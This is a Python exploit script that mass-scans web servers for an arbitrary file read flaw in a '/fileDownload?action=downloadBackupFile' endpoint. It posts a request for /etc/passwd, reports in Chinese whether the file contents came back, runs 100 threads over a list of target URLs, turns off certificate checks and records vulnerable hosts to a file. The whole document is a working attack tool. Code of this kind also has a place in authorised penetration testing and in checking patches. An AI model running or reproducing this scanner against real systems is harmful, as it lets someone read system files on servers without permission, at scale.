import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6"}
    data = {"fullPath": "/etc/passwd"}
    payload = "/fileDownload?action=downloadBackupFile"
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests.post(url=target+payload,data=data,headers=headers,verify=False)
        if 'root:' in rsp2.text and 'bin:' in rsp2.text:
            print(f'[+]{target}存在任意文件读取')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在任意文件读取')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()